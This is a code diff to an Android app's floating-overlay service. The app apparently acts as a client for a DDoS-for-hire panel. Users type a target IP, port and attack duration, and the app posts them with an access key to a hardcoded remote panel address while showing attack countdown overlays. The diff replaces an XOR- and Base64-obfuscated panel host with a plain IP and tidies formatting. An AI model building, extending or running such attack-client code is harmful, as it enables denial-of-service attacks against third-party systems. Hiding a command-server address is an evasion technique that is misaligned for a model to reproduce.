@@ -7,7 +7,6 @@ import android.graphics.PixelFormat
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
-import android.util.Base64
 import android.view.Gravity
 import android.view.LayoutInflater
 import android.view.MotionEvent
@@ -49,21 +48,6 @@ class FloatingService : Service() {
         const val MAX_ATTACK_SECONDS = 300
         const val MIN_ATTACK_SECONDS = 30
 
-        private const val XOR_KEY = 0x5A
-        private const val ENC_HOST = "OTdMSUxESENMRUxNRUxN"
-        private const val ENC_PORT = "MTUx"
-
-        fun panelBase(): String = "http://${dec(ENC_HOST)}:${dec(ENC_PORT)}"
-
-        private fun dec(enc: String): String {
-            return try {
-                val raw = Base64.decode(enc, Base64.NO_WRAP)
-                val sb = StringBuilder()
-                for (b in raw) sb.append(((b.toInt() xor XOR_KEY) and 0xFF).toChar())
-                sb.toString()
-            } catch (e: Exception) { "" }
-        }
-
         fun onIpFound(ip: String, port: String) {
             Handler(Looper.getMainLooper()).post {
                 etIpRef?.setText(ip); etPortRef?.setText(port)
@@ -88,8 +72,7 @@ class FloatingService : Service() {
     private val paramsOverlay = WindowManager.LayoutParams(
         WindowManager.LayoutParams.MATCH_PARENT, WindowManager.LayoutParams.MATCH_PARENT,
         WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, PixelFormat.TRANSLUCENT)
+        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE, PixelFormat.TRANSLUCENT)
 
     override fun onCreate() {
         super.onCreate()
@@ -137,16 +120,14 @@ class FloatingService : Service() {
             windowManager.addView(floatingView, paramsPanel)
         }
 
-        // Seekbar setup
         seekBar.max = MAX_ATTACK_SECONDS - MIN_ATTACK_SECONDS
-        seekBar.progress = 90 
+        seekBar.progress = 90
         selectedTime = MIN_ATTACK_SECONDS + seekBar.progress
         tvTime.text = "ATTACK DURATION: ${selectedTime}s"
 
         seekBar.setOnSeekBarChangeListener(object : SeekBar.OnSeekBarChangeListener {
             override fun onProgressChanged(sb: SeekBar?, progress: Int, fromUser: Boolean) {
-                val c = (MIN_ATTACK_SECONDS + progress)
-                    .coerceIn(MIN_ATTACK_SECONDS, MAX_ATTACK_SECONDS)
+                val c = (MIN_ATTACK_SECONDS + progress).coerceIn(MIN_ATTACK_SECONDS, MAX_ATTACK_SECONDS)
                 selectedTime = c
                 tvTime.text = "ATTACK DURATION: ${c}s"
             }
@@ -169,17 +150,14 @@ class FloatingService : Service() {
 
         btnAttack.setOnClickListener {
             if (isAttacking) {
-                Toast.makeText(this, "Attack already running!",
-                    Toast.LENGTH_SHORT).show(); return@setOnClickListener
+                Toast.makeText(this, "Attack already running!", Toast.LENGTH_SHORT).show(); return@setOnClickListener
             }
             val ip = etIp.text.toString().trim()
             val portStr = etPort.text.toString().trim()
             
-            // 🩸 FIX: Port ko strictly Number banaya
             val portInt = portStr.toIntOrNull()
             if (ip.isEmpty() || portInt == null) {
-                Toast.makeText(this, "IP or Valid Port missing!",
-                    Toast.LENGTH_SHORT).show(); return@setOnClickListener
+                Toast.makeText(this, "IP or Valid Port missing!", Toast.LENGTH_SHORT).show(); return@setOnClickListener
             }
             if (selectedTime > MAX_ATTACK_SECONDS) selectedTime = MAX_ATTACK_SECONDS
 
@@ -195,8 +173,7 @@ class FloatingService : Service() {
 
     private fun startButtonPulse() {
         pulseAnimator?.cancel()
-        pulseAnimator = ObjectAnimator.ofFloat(btnAttack, "alpha",
-            1f, 0.6f, 1f).apply {
+        pulseAnimator = ObjectAnimator.ofFloat(btnAttack, "alpha", 1f, 0.6f, 1f).apply {
             duration = 1000; repeatCount = ObjectAnimator.INFINITE; start()
         }
     }
@@ -206,7 +183,7 @@ class FloatingService : Service() {
         slotsThread = Thread {
             while (true) {
                 try {
-                    val url = URL("${panelBase()}/connect/slots")
+                    val url = URL("http://13.211.179.172:5000/connect/slots")
                     val conn = url.openConnection() as HttpURLConnection
                     conn.requestMethod = "GET"
                     conn.connectTimeout = 3000; conn.readTimeout = 3000
@@ -217,22 +194,16 @@ class FloatingService : Service() {
                         val total = json.optInt("slots_total", 10)
                         Handler(Looper.getMainLooper()).post {
                             tvSlots.text = "SLOTS: $used/$total"
-                            tvSlots.setTextColor(
-                                if (used >= total)
-                                    android.graphics.Color.parseColor("#EF4444")
-                                else
-                                    android.graphics.Color.parseColor("#00E5FF"))
+                            tvSlots.setTextColor(if (used >= total) android.graphics.Color.parseColor("#EF4444") else android.graphics.Color.parseColor("#00E5FF"))
                         }
                     }
                 } catch (_: InterruptedException) { break }
                 catch (_: Exception) {}
-                try { Thread.sleep(5000) }
-                catch (_: InterruptedException) { break }
+                try { Thread.sleep(5000) } catch (_: InterruptedException) { break }
             }
         }.apply { isDaemon = true; start() }
     }
 
-    // 🩸 FIX: Yahan 'port' 'Int' receive kar raha hai
     private fun startAttack(ip: String, port: Int, durationSec: Int) {
         Thread {
             var ok = false
@@ -243,20 +214,18 @@ class FloatingService : Service() {
                     Handler(Looper.getMainLooper()).post {
                         resetAttackButton()
                         tvLog.text = "> KEY EMPTY"
-                        Toast.makeText(this, "Key missing — login again",
-                            Toast.LENGTH_LONG).show()
+                        Toast.makeText(this, "Key missing — login again", Toast.LENGTH_LONG).show()
                     }
                     return@Thread
                 }
 
-                val url = URL("${panelBase()}/connect/action")
+                val url = URL("http://13.211.179.172:5000/connect/action")
                 val conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.doOutput = true
                 conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                 conn.connectTimeout = 10000; conn.readTimeout = 15000
 
-                // JSON body: time aur port dono strictly numbers hain
                 val body = JSONObject().apply {
                     put("key", key)
                     put("ip", ip)
@@ -267,8 +236,7 @@ class FloatingService : Service() {
                 conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
 
                 val code = conn.responseCode
-                val resp = (if (code in 200..299) conn.inputStream else conn.errorStream)
-                    ?.bufferedReader()?.readText() ?: ""
+                val resp = (if (code in 200..299) conn.inputStream else conn.errorStream)?.bufferedReader()?.readText() ?: ""
 
                 if (code in 200..299) {
                     try {
@@ -293,8 +261,7 @@ class FloatingService : Service() {
                 } else {
                     resetAttackButton()
                     tvLog.text = "> FAIL: $errMsg"
-                    Toast.makeText(this, "Attack fail: $errMsg",
-                        Toast.LENGTH_LONG).show()
+                    Toast.makeText(this, "Attack fail: $errMsg", Toast.LENGTH_LONG).show()
                 }
             }
         }.start()
@@ -338,8 +305,7 @@ class FloatingService : Service() {
 
     private fun showBigOverlay(num: Int) {
         if (!overlayShown) {
-            try { windowManager.addView(overlayView, paramsOverlay)
-                overlayShown = true } catch (_: Exception) {}
+            try { windowManager.addView(overlayView, paramsOverlay); overlayShown = true } catch (_: Exception) {}
         }
         val tvBig = overlayView.findViewById<TextView>(R.id.tvBigTimer)
         val tvMsg = overlayView.findViewById<TextView>(R.id.tvBigMsg)
@@ -357,8 +323,7 @@ class FloatingService : Service() {
 
     private fun showFinishedOverlay() {
         if (!overlayShown) {
-            try { windowManager.addView(overlayView, paramsOverlay)
-                overlayShown = true } catch (_: Exception) {}
+            try { windowManager.addView(overlayView, paramsOverlay); overlayShown = true } catch (_: Exception) {}
         }
         val tvBig = overlayView.findViewById<TextView>(R.id.tvBigTimer)
         val tvMsg = overlayView.findViewById<TextView>(R.id.tvBigMsg)
@@ -412,8 +377,7 @@ class FloatingService : Service() {
                     val nw = iw + (event.rawX - initialTouchX).toInt()
                     val nh = ih + (event.rawY - initialTouchY).toInt()
                     paramsPanel.width = if (nw > 300) nw else 300
-                    paramsPanel.height = if (nh > 200) nh
-                        else WindowManager.LayoutParams.WRAP_CONTENT
+                    paramsPanel.height = if (nh > 200) nh else WindowManager.LayoutParams.WRAP_CONTENT
                     windowManager.updateViewLayout(floatingView, paramsPanel)
                     true
                 }
@@ -459,10 +423,8 @@ class FloatingService : Service() {
         pulseAnimator?.cancel()
         slotsThread?.interrupt()
         hideOverlay()
-        try { if (::floatingView.isInitialized)
-            windowManager.removeView(floatingView) } catch (_: Exception) {}
-        try { if (::bubbleView.isInitialized)
-            windowManager.removeView(bubbleView) } catch (_: Exception) {}
+        try { if (::floatingView.isInitialized) windowManager.removeView(floatingView) } catch (_: Exception) {}
+        try { if (::bubbleView.isInitialized) windowManager.removeView(bubbleView) } catch (_: Exception) {}
         instance = null
     }
 
